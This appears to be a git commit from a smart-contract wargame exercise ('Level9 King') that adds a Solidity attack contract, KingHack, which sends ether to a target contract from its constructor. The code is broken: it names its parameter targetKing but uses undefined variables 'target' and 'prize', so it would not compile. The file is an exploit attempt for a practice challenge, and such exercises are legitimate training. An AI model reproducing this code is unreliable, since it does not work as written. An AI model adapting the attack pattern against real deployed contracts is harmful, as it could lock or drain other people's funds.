da0dc1591ad348eb11769c9e864bcb8e82ba6c5f
miield <aodasola95@gmail.com>
2023-04-24 23:44:38 +0100

    Level9 King

---
+++ King/kingHack.sol
@@ -0,0 +1,12 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./king.sol";
+
+contract KingHack {
+
+    constructor (address payable targetKing) payable {
+        (bool okay,) = target.call{value: prize} ("");
+    }
+
+}
